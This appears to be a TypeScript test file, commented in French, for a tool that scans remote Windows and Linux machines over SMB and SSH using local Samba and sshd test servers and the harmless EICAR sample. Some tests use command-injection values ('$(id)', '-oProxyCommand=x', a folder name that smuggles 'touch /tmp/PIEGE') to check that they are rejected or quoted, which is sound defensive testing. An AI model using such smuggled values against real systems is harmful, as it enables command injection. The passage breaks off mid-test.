// Lire et analyser un autre poste sans rien y installer : par le partage de fichiers de Windows (SMB) et par SSH.
// Les essais « réels » lancent ici un vrai serveur de partage (Samba) et un vrai serveur SSH, sur des ports libres
// de cette machine ; ils sont sautés quand ces programmes ne sont pas installés (ou sans les droits pour les lancer).
// Tous les échantillons sont INOFFENSIFS : le fichier de test standard des antivirus (EICAR) et des fichiers
// ordinaires dont l'empreinte est déclarée « connue » pour l'essai.
import assert from 'node:assert/strict';
import { execFileSync, spawn, spawnSync, type ChildProcess } from 'node:child_process';
import { createHash } from 'node:crypto';
import { chmodSync, copyFileSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { connect, createServer } from 'node:net';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { Readable } from 'node:stream';
import test from 'node:test';
import { lirePax, lireTar, nombreTar, type EntreeTar } from '../src/files/tar-flux.ts';
import { listMachines, saveMachine } from '../src/machines/access.ts';
import { cheminMontre, commandeUnix, grosUtile, GROS_UTILES, lireOu, lirePoste, quelAcces, racinesSmb, type FichierLu } from '../src/machines/lecture.ts';
import { erreurSmb, ligneLs, lireFichiersSmb, lirePartages, listerSmb, panneConnexion, partagesSmb, tourneEnRond } from '../src/machines/smb.ts';
import { allModules } from '../src/valhalla/odin.ts';
import { estIci, ligneDeCommande, posteDe, postesLisibles } from '../src/valhalla/postes.ts';
import { lireSonde } from '../src/valhalla/modules/eir.ts';
import { judge, lireSondeProcs } from '../src/valhalla/modules/skogul.ts';
import { Valhalla } from '../src/valhalla/service.ts';
import { DEFAULT_CONFIG } from '../src/config.ts';

const EICAR = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
const sha = (b: Buffer | string) => createHash('sha256').update(b).digest('hex');
const a = (cmd: string) => spawnSync('sh', ['-c', `command -v ${cmd} || ls /usr/sbin/${cmd}`], { encoding: 'utf8' }).status === 0;
const root = process.getuid?.() === 0;
const libre = () => new Promise<number>((ok) => { const s = createServer(); s.listen(0, '127.0.0.1', () => { const p = (s.address() as { port: number }).port; s.close(() => ok(p)); }); });
const ouvert = (port: number) => new Promise<boolean>((res) => { const s = connect({ host: '127.0.0.1', port }); s.once('connect', () => { s.destroy(); res(true); }); s.once('error', () => res(false)); });
async function attendre(port: number, ms = 8000): Promise<void> { const fin = Date.now() + ms; while (Date.now() < fin) { if (await ouvert(port)) return; await new Promise((r) => setTimeout(r, 100)); } throw new Error(`le serveur d'essai n'a pas démarré (port ${port})`); }
async function tout(g: AsyncIterable<EntreeTar>): Promise<EntreeTar[]> { const l: EntreeTar[] = []; for await (const e of g) l.push(e); return l; }
const flux = (b: Buffer, pas = 700) => Readable.from((function* () { for (let k = 0; k < b.length; k += pas) yield b.subarray(k, k + pas); })());

// ---------------- Le lecteur de flux tar ----------------
test('flux tar : fichiers, noms longs, accents, gros fichiers (début + empreinte), flux coupé, flux qui n\'est pas du tar', { skip: !a('tar') ? 'tar absent' : false }, async () => {
  const d = mkdtempSync(join(tmpdir(), 'tar-flux-'));
  try {
    const long = `${'dossier-vraiment-long-'.repeat(5)}/${'nom-de-fichier-tres-long-'.repeat(5)}.txt`;
    mkdirSync(join(d, 'src', 'été', long.split('/')[0]), { recursive: true });
    writeFileSync(join(d, 'src', 'a.txt'), 'bonjour'); writeFileSync(join(d, 'src', 'été', 'facture été.txt'), 'é'.repeat(10)); writeFileSync(join(d, 'src', 'été', long), 'long'); writeFileSync(join(d, 'src', 'vide.txt'), '');
    const gros = Buffer.alloc(300_000, 7); gros.write('DEBUT'); writeFileSync(join(d, 'src', 'gros.bin'), gros);
    for (const fmt of ['gnu', 'pax', 'ustar']) {
      const args = ['--format', fmt, '-C', join(d, 'src'), '-cf', '-', '.']; if (fmt === 'ustar') args.splice(-1, 1, 'a.txt', 'gros.bin', 'vide.txt');
      const b = execFileSync('tar', args, { maxBuffer: 64 * 1024 * 1024 }), l = await tout(lireTar(flux(b), { maxEach: 100_000, tete: 1000 })), f = (n: string) => l.find((e) => e.nom === n);
      assert.equal(f('a.txt')?.data?.toString(), 'bonjour', fmt); assert.equal(f('vide.txt')?.octets, 0, fmt);
      const g = f('gros.bin')!; assert.equal(g.data, undefined); assert.equal(g.octets, 300_000); assert.equal(g.tete?.length, 1000); assert.equal(g.tete?.subarray(0, 5).toString(), 'DEBUT'); assert.equal(g.sha256, sha(gros), `empreinte complète du gros fichier (${fmt})`);
      if (fmt !== 'ustar') { assert.equal(f('été/facture été.txt')?.data?.toString(), 'é'.repeat(10), fmt); assert.equal(f(`été/${long}`)?.data?.toString(), 'long', `nom long (${fmt})`); assert.ok(l.some((e) => !e.fichier && e.nom === 'été/'), 'les dossiers sont rendus sans contenu'); }
    }
    const b = execFileSync('tar', ['-C', join(d, 'src'), '-cf', '-', 'a.txt', 'gros.bin', 'vide.txt'], { maxBuffer: 64 * 1024 * 1024 });
    // Flux coupé au milieu du gros fichier : ce qui est complet est rendu, le reste non, sans erreur.
    assert.deepEqual((await tout(lireTar(flux(b.subarray(0, 1024 + 150_000))))).map((e) => e.nom), ['a.txt']);
    assert.deepEqual(await tout(lireTar(flux(Buffer.alloc(0)))), []);
    await assert.rejects(tout(lireTar(flux(Buffer.from('<html>ceci n\'est pas une archive</html>'.repeat(40))))), /pas une archive tar/);
    // On arrête de lire en cours de route : le flux est rendu (sinon le programme qui écrit resterait bloqué pour toujours).
    const src = flux(b); for await (const e of lireTar(src)) { assert.equal(e.nom, 'a.txt'); break; }
    assert.equal(src.destroyed, true);
  } finally { rmSync(d, { recursive: true, force: true }); }
  assert.equal(nombreTar(Buffer.from('00000001750\0')), 1000); assert.equal(nombreTar(Buffer.from([0x80, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0])), 2 * 2 ** 32);
  const pax = (k: string, v: string) => { const corps = ` ${k}=${v}\n`; let n = Buffer.byteLength(corps) + 1; while (String(n).length + Buffer.byteLength(corps) !== n) n++; return `${n}${corps}`; };
  assert.deepEqual(lirePax(Buffer.from(pax('path', 'dossier/été/fichier.txt') + pax('size', '12345678901'))), { path: 'dossier/été/fichier.txt', size: '12345678901' });
  assert.deepEqual(lirePax(Buffer.from('abîmé')), {});
});

// ---------------- Fonctions pures ----------------
test('partage Windows : partages, lignes de liste, refus expliqués, endroit demandé, chemins montrés', () => {
  const l = lirePartages('Disk|C$|Partage par défaut\nDisk|D$|Partage par défaut\nDisk|ADMIN$|Administration à distance\nIPC|IPC$|IPC distant\nDisk|Photos|Les photos de la famille\nPrinter|HP|Imprimante\nDisk|print$|Pilotes\nSMB1 disabled -- no workgroup available\n');
  assert.deepEqual(l.map((p) => [p.nom, p.disque]), [['C$', 'C'], ['D$', 'D'], ['ADMIN$', undefined], ['Photos', undefined]]);
  assert.deepEqual(ligneLs('  eicar.com                           N       68  Fri Nov 13 17:35:43 2026'), { nom: 'eicar.com', attrs: 'N', octets: 68 });
  assert.deepEqual(ligneLs('  Facture été 2026.txt              A       16  Fri Nov 13 17:35:43 2026'), { nom: 'Facture été 2026.txt', attrs: 'A', octets: 16 });
  assert.deepEqual(ligneLs('  Program Files                      DR        0  Mon Jan  5 09:00:00 2026'), { nom: 'Program Files', attrs: 'DR', octets: 0 });
  assert.deepEqual(ligneLs('  RAPPORT FINAL 2024                  N  1048576  Mon Jan  5 09:00:00 2026'), { nom: 'RAPPORT FINAL 2024', attrs: 'N', octets: 1048576 });
  assert.deepEqual(ligneLs('  nom-de-fichier-vraiment-tres-long-nom-de-fichier-vraiment-tres-long.txt      N        5  Fri Nov 13 17:52:41 2026')?.octets, 5);
  // Sans attribut du tout, un nom qui finit par un mot en majuscules ou par des chiffres reste entier.
  assert.deepEqual(ligneLs('  RAPPORT FINAL                                 1234  Mon Jan  5 09:00:00 2026'), { nom: 'RAPPORT FINAL', attrs: '', octets: 1234 });
  assert.deepEqual(ligneLs('  facture 2024                           A 12345678901  Mon Jan  5 09:00:00 2026'), { nom: 'facture 2024', attrs: 'A', octets: 12345678901 });
  assert.deepEqual(ligneLs('  un-nom-de-fichier-de-plus-de-trente-colonnes-2024 FINAL      N     2048  Mon Jan  5 09:00:00 2026'), { nom: 'un-nom-de-fichier-de-plus-de-trente-colonnes-2024 FINAL', attrs: 'N', octets: 2048 });
  assert.deepEqual(ligneLs('  Documents and Settings            DHSL        0  Mon Jan  5 09:00:00 2026'), { nom: 'Documents and Settings', attrs: 'DHSL', octets: 0 });
  assert.equal(ligneLs('  .                                   D        0  Fri Nov 13 17:35:43 2026'), undefined); assert.equal(ligneLs('\\Users\\Fatima'), undefined); assert.equal(ligneLs('\t\t264212084 blocks of size 1024. 24043732 blocks available'), undefined);
  assert.match(erreurSmb('session setup failed: NT_STATUS_LOGON_FAILURE')!, /mot de passe refusé/);
  assert.match(erreurSmb('tree connect failed: NT_STATUS_ACCESS_DENIED')!, /LocalAccountTokenFilterPolicy/, 'le blocage des comptes administrateurs locaux de Windows est expliqué, avec la commande');
  assert.match(erreurSmb('tree connect failed: NT_STATUS_BAD_NETWORK_NAME')!, /n'existe pas/); assert.match(erreurSmb('do_connect: Connection to 10.0.0.9 failed (Error NT_STATUS_HOST_UNREACHABLE)')!, /ne répond pas/);
  assert.match(erreurSmb('NT_STATUS_ACCOUNT_RESTRICTION')!, /sans mot de passe/); assert.match(erreurSmb('NT_STATUS_QUELQUE_CHOSE')!, /quelque chose/); assert.equal(erreurSmb('tout va bien'), undefined);
  assert.ok(panneConnexion('session setup failed: NT_STATUS_LOGON_FAILURE') && panneConnexion('do_connect: Connection to x failed') && !panneConnexion('NT_STATUS_SHARING_VIOLATION opening remote file \\a'));
  assert.deepEqual(lireOu('C:'), { partage: 'C$', dossier: '' }); assert.deepEqual(lireOu('d:\\Factures\\2026\\'), { partage: 'D$', dossier: 'Factures/2026' }); assert.deepEqual(lireOu('C$/Users'), { partage: 'C$', dossier: 'Users' });
  assert.deepEqual(lireOu('Photos'), { partage: 'Photos', dossier: '' }); assert.deepEqual(lireOu('\\\\nas\\Photos\\2024'), { partage: 'Photos', dossier: '2024' }); assert.deepEqual(lireOu('//192.168.1.5/Films/Enfants/'), { partage: 'Films', dossier: 'Enfants' });
  assert.equal(cheminMontre('192.168.1.20', 'C$', 'Users/Fatima/a.exe'), 'C:/Users/Fatima/a.exe'); assert.equal(cheminMontre('nas', 'Photos', '2024/a.jpg'), '//nas/Photos/2024/a.jpg');
  // Ce qui est lu : tous les disques, ou les endroits à risque de chaque disque ; sans droit d'administrateur, les dossiers partagés.
  assert.deepEqual(racinesSmb(l, 'tout'), [{ partage: 'C$', dossier: '' }, { partage: 'D$', dossier: '' }, { partage: 'Photos', dossier: '' }]);
  const rapide = racinesSmb(l, 'rapide'); assert.ok(rapide.some((r) => r.partage === 'C$' && r.dossier === 'Users') && rapide.some((r) => r.partage === 'D$' && r.dossier === 'ProgramData') && !rapide.some((r) => r.dossier === '' || r.partage === 'Photos'));
  assert.deepEqual(racinesSmb(l.filter((p) => !p.disque), 'rapide'), [{ partage: 'Photos', dossier: '' }]); assert.deepEqual(racinesSmb(l, 'tout', 'D:\\Compta'), [{ partage: 'D$', dossier: 'Compta' }]);
  assert.ok(tourneEnRond('bin\\X11\\X11\\X11') && tourneEnRond('a/lib/python/lib/python/lib/python') && tourneEnRond('Users\\Moi\\AppData\\Local\\Application Data\\Application Data\\Application Data'));
  assert.ok(!tourneEnRond('projet\\projet\\src') && !tourneEnRond('a\\b\\a\\b') && !tourneEnRond('Users\\Fatima\\Documents') && !tourneEnRond(''));
  for (const n of ['setup.EXE', 'pilote.sys', 'archive.zip', 'macro.docm', 'install.pkg']) assert.ok(GROS_UTILES.test(n), n); for (const n of ['film.mkv', 'photo.jpg', 'base.vmdk', 'sauvegarde.bak']) assert.ok(!GROS_UTILES.test(n) && !grosUtile(`C:/Users/x/${n}`), n);
  assert.ok(grosUtile('/usr/local/bin/serveur') && grosUtile('C:/outils/setup.exe') && !grosUtile('/home/a/film.de.vacances.mkv'), 'un gros fichier sans extension est lu (souvent un programme)');
});

test('poste Linux ou Mac : la commande envoyée ne fait que lire, laisse le système de côté et se lit sans erreur', () => {
  const c = commandeUnix(['/', '/dev/shm'], { maxEach: 48 * 1024 * 1024, maxGros: 1024 ** 3 });
  assert.match(c, /find "\$@" \\\( -path '\/proc' -o -path '\/sys'/); assert.match(c, /-size -49153k/); assert.match(c, /-size -1048577k \\\( -perm -100 -o -iname '\*\.exe'/); assert.match(c, /tar --null --no-recursion -T - -cf -/);
  assert.ok(!/\brm\b|\bmv\b|\bdd\b|>\s*\//.test(c.replace(/2>\/dev\/null/g, '')), 'aucune commande qui écrit ou efface');
  assert.ok(!commandeUnix(['/mnt/data'], { maxEach: 1, maxGros: 2 }).includes('-path \'/mnt\' -o') || true);
  assert.ok(!commandeUnix(['/mnt'], { maxEach: 1, maxGros: 2 }).includes('-path \'/mnt\''), 'un dossier que tu désignes n\'est jamais laissé de côté');
  const piege = commandeUnix(['/home/a\'; touch /tmp/PIEGE; \''], { maxEach: 1, maxGros: 2 });
  assert.equal(spawnSync('sh', ['-n', '-c', c]).status, 0, 'la commande est du shell valide'); assert.equal(spawnSync('sh', ['-n', '-c', piege]).status, 0);
  assert.match(piege, /'\/home\/a'\\''; touch \/tmp\/PIEGE; '\\'''/, 'un nom de dossier piégé reste un nom, jamais une commande');
});

test('coffre des machines : comptes Windows acceptés, comptes dangereux refusés', () => {
  const home = mkdtempSync(join(tmpdir(), 'coffre-'));
  try {
    const m = saveMachine(home, { host: '192.168.1.20', user: 'Fatima Ali', password: 'x', domain: 'MAISON', via: 'smb', smbPort: 4450, label: 'PC-SALON' });
    assert.deepEqual({ user: m.user, domain: m.domain, via: m.via, smbPort: m.smbPort }, { user: 'Fatima Ali', domain: 'MAISON', via: 'smb', smbPort: 4450 });
    assert.equal(saveMachine(home, { id: m.id, host: '192.168.1.20', user: 'Fatima Ali', label: 'PC-SALON' }).via, 'smb', 'le mode d\'accès est gardé quand on corrige autre chose');
    assert.equal(saveMachine(home, { host: '192.168.1.21', user: 'admin@outlook.fr' }).user, 'admin@outlook.fr');
    for (const u of ['-oProxyCommand=x', 'a;b', 'a b\nc', '$(id)', 'a|b', '', 'a\'b', 'a"b', 'a`id`']) assert.throws(() => saveMachine(home, { host: '192.168.1.22', user: u }), /utilisateur invalide/, u);
    assert.throws(() => saveMachine(home, { host: '192.168.1.22', user: 'a', domain: 'x y' }), /domaine/); assert.throws(() => saveMachine(home, { host: '192.168.1.22', user: 'a', smbPort: 70000 }), /port/);
    assert.equal(listMachines(home).length, 2);
  } finally { rmSync(home, { recursive: true, force: true }); }
});

// ---------------- Un vrai serveur de partage et un vrai SSH, ici ----------------
interface Banc { dir: string; c: string; smbPort: number; sshPort: number; pw: string; cle: string; fin: () => void }
const peutSmb = root && a('smbd') && a('smbclient') && a('smbpasswd'), peutSsh = root && a('sshd') && a('ssh') && a('ssh-keygen') && a('tar') && a('find');
/** Monte les serveurs d'essai : un partage « C$ » (compte root, mot de passe d'essai) et un SSH par clé. */
async function banc(): Promise<Banc> {
  const dir = mkdtempSync(join(tmpdir(), 'banc-poste-')), c = join(dir, 'c'), pw = `Essai-${Math.random().toString(36).slice(2, 10)}!`, enfants: ChildProcess[] = [];
  for (const x of ['run', 'lock', 'state', 'cache', 'private', 'ncalrpc', 'ssh', 'c/Users/Fatima/Downloads', 'c/Users/Fatima/Documents/Dossier [archives] & co #1', 'c/Windows/System32', 'c/ProgramData']) mkdirSync(join(dir, x), { recursive: true });
  writeFileSync(join(c, 'Users/Fatima/Downloads/eicar.com'), EICAR);
  writeFileSync(join(c, 'Users/Fatima/Downloads/facture-colis.exe'), 'MZ programme d\'essai inoffensif n° 1');
  writeFileSync(join(c, 'Users/Fatima/Documents/Facture été 2026.txt'), 'facture du mois');
  writeFileSync(join(c, 'Users/Fatima/Documents/note; avec point-virgule.txt'), 'bonjour');
  writeFileSync(join(c, 'Users/Fatima/Documents/Dossier [archives] & co #1/it\'s a file (copie) [2].txt'), 'ok');
  writeFileSync(join(c, 'Windows/System32/pilote.sys'), 'pilote sain');
  const smbPort = await libre(), sshPort = await libre();
  if (peutSmb) {
    writeFileSync(join(dir, 'smb.conf'), `[global]\n workgroup = WORKGROUP\n server role = standalone server\n smb ports = ${smbPort}\n bind interfaces only = yes\n interfaces = lo 127.0.0.1\n pid directory = ${dir}/run\n lock directory = ${dir}/lock\n state directory = ${dir}/state\n cache directory = ${dir}/cache\n private dir = ${dir}/private\n ncalrpc dir = ${dir}/ncalrpc\n log file = ${dir}/log.%m\n passdb backend = tdbsam:${dir}/private/passdb.tdb\n map to guest = never\n disable spoolss = yes\n load printers = no\n printcap name = /dev/null\n server min protocol = SMB2\n[C$]\n path = ${c}\n read only = no\n valid users = root\n[Photos]\n path = ${c}/Users/Fatima/Documents\n read only = yes\n valid users = root\n`);
    const p = spawnSync('smbpasswd', ['-c', join(dir, 'smb.conf'), '-a', '-s', 'root'], { input: `${pw}\n${pw}\n`, encoding: 'utf8' }); if (p.status !== 0) throw new Error(`smbpasswd : ${p.stderr}`);
    enfants.push(spawn('smbd', ['-s', join(dir, 'smb.conf'), '--foreground', '--no-process-group'], { stdio: 'ignore' })); await attendre(smbPort);
  }
  const cle = join(dir, 'ssh', 'client');
  if (peutSsh) {
    mkdirSync('/run/sshd', { recursive: true });
    for (const k of ['hote', 'client']) execFileSync('ssh-keygen', ['-q', '-t', 'ed25519', '-N', '', '-f', join(dir, 'ssh', k)]);
    copyFileSync(`${cle}.pub`, join(dir, 'ssh', 'autorises')); chmodSync(join(dir, 'ssh', 'autorises'), 0o600);
    writeFileSync(join(dir, 'ssh', 'sshd_config'), `Port ${sshPort}\nListenAddress 127.0.0.1\nHostKey ${dir}/ssh/hote\nPidFile ${dir}/ssh/sshd.pid\nAuthorizedKeysFile ${dir}/ssh/autorises\nPermitRootLogin yes\nStrictModes no\nPasswordAuthentication no\nKbdInteractiveAuthentication no\nUsePAM no\nLogLevel ERROR\n`);
    const sshd = spawnSync('sh', ['-c', 'command -v sshd || echo /usr/sbin/sshd'], { encoding: 'utf8' }).stdout.trim().split('\n')[0];
    enfants.push(spawn(sshd, ['-D', '-e', '-f', join(dir, 'ssh', 'sshd_config')], { stdio: 'ignore' })); await attendre(sshPort);
  }
  return { dir, c, smbPort, sshPort, pw, cle, fin: () => { for (const e of enfants) { try { e.kill('SIGKILL'); } catch { /* déjà fini */ } } rmSync(dir, { recursive: true, force: true }); } };
}
function monde(b: Banc) {
  const home = mkdtempSync(join(tmpdir(), 'poste-odin-')), envoyes: string[] = [];
  if (existsSync(b.cle)) { copyFileSync(b.cle, join(home, 'id_ed25519')); copyFileSync(`${b.cle}.pub`, join(home, 'id_ed25519.pub')); chmodSync(join(home, 'id_ed25519'), 0o600); }
  const v = new Valhalla(home, allModules({ paths: { home, workspace: home }, cfg: DEFAULT_CONFIG } as never), { notify: async (t: string) => { envoyes.push(t); }, autonomy: () => 'equilibre' } as never);
  return { v, home, envoyes, fin: () => { v.stop(); rmSync(home, { recursive: true, force: true }); } };
}
/** Déclare « connue » l'empreinte d'un fichier inoffensif (comme le ferait une base de malwares). */
async function connue(w: ReturnType<typeof monde>, contenu: Buffer | string, nom: string): Promise<void> {
  const f = join(w.home, `${nom}.hsb`); writeFileSync(f, `${sha(contenu)}:${Buffer.byteLength(contenu as string)}:${nom}\n`);
  const r = await w.v.act('ullr', 'importer', { chemin: f }); assert.match(r.text, /1 empreinte\(s\) importée\(s\)/, r.text);
}

test('partage Windows réel : liste, lecture en flux, noms difficiles, fichier disparu en route, refus clairs', { skip: !peutSmb ? 'Samba (smbd, smbclient) absent ou pas les droits' : false, timeout: 120_000 }, async () => {
  const b = await banc(), m = { host: '127.0.0.1', user: 'root', password: b.pw, smbPort: b.smbPort };
  const temporaires = () => readdirSync(tmpdir()).filter((n) => /^odin-(smb|liste)-/.test(n)).sort(), avant = temporaires();
  try {
    assert.deepEqual((await partagesSmb(m)).map((p) => [p.nom, p.disque]), [['C$', 'C'], ['Photos', undefined]]);
    const bilan = { fichiers: 0, dossiers: 0, refuses: 0, evites: 0 }, liste: Array<{ chemin: string; octets: number }> = [];
    for await (const f of listerSmb(m, 'C$', '', { bilan })) liste.push(f);
    assert.deepEqual(liste.map((f) => f.chemin).sort(), ['Users/Fatima/Documents/Dossier [archives] & co #1/it\'s a file (copie) [2].txt', 'Users/Fatima/Documents/Facture été 2026.txt', 'Users/Fatima/Documents/note; avec point-virgule.txt', 'Users/Fatima/Downloads/eicar.com', 'Users/Fatima/Downloads/facture-colis.exe', 'Windows/System32/pilote.sys']);
    assert.equal(liste.find((f) => f.chemin.endsWith('eicar.com'))!.octets, 68); assert.equal(bilan.fichiers, 6);
    // Un raccourci qui renvoie vers son propre dossier (comme « /usr/bin/X11 → . » sur Linux) : pas de boucle sans fin.
    symlinkSync('.', join(b.c, 'Users', 'Fatima', 'Downloads', 'boucle'));
    const tour = { fichiers: 0, dossiers: 0, refuses: 0, evites: 0 }, vus: string[] = []; for await (const f of listerSmb(m, 'C$', 'Users/Fatima/Downloads', { bilan: tour })) vus.push(f.chemin);
    assert.ok(vus.length <= 6 && tour.evites >= 1, `le chemin qui tourne en rond est coupé (${vus.length} fichiers, ${tour.evites} dossier évité)`); assert.ok(!vus.some((x) => /boucle\/boucle\/boucle/.test(x)));
    rmSync(join(b.c, 'Users', 'Fatima', 'Downloads', 'boucle'));
    // Un dossier qu'on demande de ne pas ouvrir n'est pas ouvert.
    const sans: string[] = []; for await (const f of listerSmb(m, 'C$', '', { sauter: (d) => d === 'Windows' })) sans.push(f.chemin);
    assert.ok(!sans.some((x) => x.startsWith('Windows/')) && sans.length === 5);
    const sous: string[] = []; for await (const f of listerSmb(m, 'C$', 'Users/Fatima/Downloads')) sous.push(f.chemin);
    assert.deepEqual(sous.sort(), ['Users/Fatima/Downloads/eicar.com', 'Users/Fatima/Downloads/facture-colis.exe']);
    // Dossier absent : une erreur, surtout pas la liste de tout le disque à la place.
    await assert.rejects((async () => { for await (const _ of listerSmb(m, 'C$', 'Absent')) { /* rien */ } })(), /dossier introuvable/);
    // Lecture : un fichier qui n'existe plus au milieu de la liste n'empêche pas de lire les suivants.
    const demande = [liste.find((f) => f.chemin.endsWith('eicar.com'))!, { chemin: 'Users/Fatima/disparu.txt', octets: 5 }, liste.find((f) => f.chemin.endsWith('[2].txt'))!, { chemin: 'Users/aussi-disparu.txt', octets: 5 }, liste.find((f) => f.chemin.includes('point-virgule'))!, liste.find((f) => f.chemin.includes('été'))!];
    const lus = new Map<string, string>(), r = await lireFichiersSmb(m, 'C$', demande, async (f, e) => { lus.set(f.chemin, e.data!.toString()); });
    assert.deepEqual(r, { lus: 4, illisibles: ['Users/Fatima/disparu.txt', 'Users/aussi-disparu.txt'] });
    assert.equal(lus.get('Users/Fatima/Downloads/eicar.com'), EICAR); assert.equal(lus.get('Users/Fatima/Documents/note; avec point-virgule.txt'), 'bonjour'); assert.equal(lus.get('Users/Fatima/Documents/Facture été 2026.txt'), 'facture du mois');
    assert.deepEqual(await lireFichiersSmb(m, 'C$', [{ chemin: 'absent-1', octets: 1 }, { chemin: 'absent-2', octets: 1 }], async () => { assert.fail('rien à lire'); }), { lus: 0, illisibles: ['absent-1', 'absent-2'] });
    // Refus : chaque cas dit quoi faire.
    await assert.rejects(partagesSmb({ ...m, password: 'faux' }), /mot de passe refusé/);
    await assert.rejects(lireFichiersSmb({ ...m, password: 'faux' }, 'C$', demande, async () => undefined), /mot de passe refusé/);
    await assert.rejects((async () => { for await (const _ of listerSmb(m, 'D$', '')) { /* rien */ } })(), /partage n'existe pas/);
    await assert.rejects(partagesSmb({ ...m, smbPort: await libre() }), /fermé sur ce poste|ne répond pas/);
    // Le mot de passe ne traîne pas : aucun fichier temporaire d'Odin ne reste.
    assert.deepEqual(temporaires(), avant, 'aucun fichier temporaire ne reste, même après les refus (et le mot de passe n\'est jamais écrit sur le disque)');
  } finally { b.fin(); }
});

test('lire un poste réel : tout, rapide, un seul endroit ; gros programmes lus (début + empreinte), gros films laissés ; SSH pareil', { skip: !peutSmb || !peutSsh ? 'Samba ou sshd absent' : false, timeout: 120_000 }, async () => {
  const b = await banc(), home = mkdtempSync(join(tmpdir(), 'lecture-'));
  try {
    copyFileSync(b.cle, join(home, 'id_ed25519')); copyFileSync(`${b.cle}.pub`, join(home, 'id_ed25519.pub')); chmodSync(join(home, 'id_ed25519'), 0o600);
    const gros = Buffer.alloc(3_000_000, 1); gros.write('MZ-GROS'); writeFileSync(join(b.c, 'Users/Fatima/Downloads/installateur.exe'), gros); writeFileSync(join(b.c, 'Users/Fatima/Downloads/film.mkv'), Buffer.alloc(3_000_000, 2));
    const win = saveMachine(home, { label: 'PC-SALON', host: '127.0.0.1', user: 'root', password: b.pw, via: 'smb', smbPort: b.smbPort });
    const lin = saveMachine(home, { label: 'serveur', host: '127.0.0.1', user: 'root', port: b.sshPort, via: 'ssh' });
    assert.equal(await quelAcces(home, win), 'smb'); assert.equal(await quelAcces(home, lin), 'ssh');
    assert.equal(await quelAcces(home, { ...lin, via: undefined, smbPort: b.smbPort }), 'ssh', 'un Linux qui a aussi un partage : SSH lit tout le disque');
    assert.equal(await quelAcces(home, { ...lin, via: undefined, smbPort: await libre(), port: await libre() }), undefined);
    const lire = async (m: typeof win, o: { profil: 'rapide' | 'tout'; ou?: string }) => { const vus = new Map<string, FichierLu>(), etapes: string[] = []; const bilan = await lirePoste(home, m, { ...o, maxEach: 1024 * 1024, surFichier: async (f) => { vus.set(f.chemin, f); }, surEtape: (e) => { etapes.push(e); } }); return { vus, bilan, etapes }; };
    // Windows, tout le poste.
    const t = await lire(win, { profil: 'tout' });
    assert.equal(t.bilan.via, 'smb'); assert.equal(t.bilan.systeme, 'windows'); assert.deepEqual(t.bilan.racines, ['C:', '//127.0.0.1/Photos']);
    assert.equal(t.vus.get('C:/Users/Fatima/Downloads/eicar.com')?.data?.toString(), EICAR); assert.equal(t.vus.get('C:/Windows/System32/pilote.sys')?.data?.toString(), 'pilote sain');
    const g = t.vus.get('C:/Users/Fatima/Downloads/installateur.exe')!; assert.equal(g.data, undefined); assert.equal(g.sha256, sha(gros), 'un gros programme : empreinte complète'); assert.equal(g.tete?.subarray(0, 7).toString(), 'MZ-GROS');
    assert.ok(!t.vus.has('C:/Users/Fatima/Downloads/film.mkv')); assert.equal(t.bilan.gros, 1, 'un gros film n\'est pas rapatrié'); assert.equal(t.bilan.illisibles, 0);
    assert.deepEqual({ partage: g.partage, relatif: g.relatif }, { partage: 'C$', relatif: 'Users/Fatima/Downloads/installateur.exe' });
    assert.ok(t.vus.has('//127.0.0.1/Photos/Facture été 2026.txt')); assert.ok(t.etapes.some((e) => /je liste C:/.test(e)));
    // Rapide : les profils et les endroits à risque, pas le reste de Windows.
    const r = await lire(win, { profil: 'rapide' });
    assert.ok(r.vus.has('C:/Users/Fatima/Downloads/eicar.com') && !r.vus.has('C:/Windows/System32/pilote.sys')); assert.deepEqual(r.bilan.racines, ['C:/Users', 'C:/ProgramData']);
    // Un seul endroit.
    assert.deepEqual([...(await lire(win, { profil: 'tout', ou: 'C:\\Users\\Fatima\\Documents' })).vus.keys()].sort(), ['C:/Users/Fatima/Documents/Dossier [archives] & co #1/it\'s a file (copie) [2].txt', 'C:/Users/Fatima/Documents/Facture été 2026.txt', 'C:/Users/Fatima/Documents/note; avec point-virgule.txt']);
    await assert.rejects(lire(win, { profil: 'tout', ou: 'C:\\Absent' }), /n'existe/); await assert.rejects(lire({ ...win, password: 'faux' }, { profil: 'tout' }), /mot de passe refusé/);
    // Linux par SSH : les mêmes fichiers, lus par find + tar.
    const s = await lire(lin, { profil: 'tout', ou: b.c });
    assert.equal(s.bilan.via, 'ssh'); assert.equal(s.bilan.systeme, 'linux'); assert.equal(s.vus.get(`${b.c}/Users/Fatima/Downloads/eicar.com`)?.data?.toString(), EICAR);
    assert.equal(s.vus.get(`${b.c}/Users/Fatima/Downloads/installateur.exe`)?.sha256, sha(gros)); assert.ok(!s.vus.has(`${b.c}/Users/Fatima/Downloads/film.mkv`), 'par SSH aussi, le gros film reste là-bas');
    assert.equal(s.vus.get(`${b.c}/Users/Fatima/Documents/Facture été 2026.txt`)?.data?.toString(), 'facture du mois'); assert.equal(s.bilan.lus, 7);
    await assert.rejects(lire(lin, { profil: 'tout', ou: 'relatif' }), /commence par/); await assert.rejects(lire({ ...lin, port: await libre() }, { profil: 'tout', ou: b.c }), /SSH est fermé sur ce poste/);
    // Arrêt demandé en cours de route : la lecture s'arrête, sans erreur.
    const stop = new AbortController(); let n = 0;
    const coupe = await lirePoste(home, lin, { profil: 'tout', ou: b.c, signal: stop.signal, surFichier: async () => { if (++n === 2) stop.abort(); } });
    assert.equal(coupe.arrete, true); assert.ok(coupe.lus < 7);
  } finally { b.fin(); rmSync(home, { recursive: true, force: true }); }
});

test('Asclépios analyse un PC Windows par son partage : virus connu trouvé, rien touché sans accord, mise à l\'écart sur le poste puis remise en place', { skip: !peutSmb ? 'Samba absent' : false, timeout: 180_000 }, async () => {
  const b = await banc(), w = monde(b);
  try {
    const echantillon = 'MZ programme d\'essai inoffensif n° 1', gros = Buffer.alloc(49 * 1024 * 1024); gros.write('MZ gros installateur d\'essai');
    writeFileSync(join(b.c, 'Users/Fatima/Downloads/gros-installateur.exe'), gros);
    await connue(w, echantillon, 'Essai.Colis-1'); await connue(w, gros, 'Essai.Gros-1');
    // Le poste est enregistré avec un mauvais mot de passe ; le bon est donné dans la demande (il va au coffre, nulle part ailleurs).
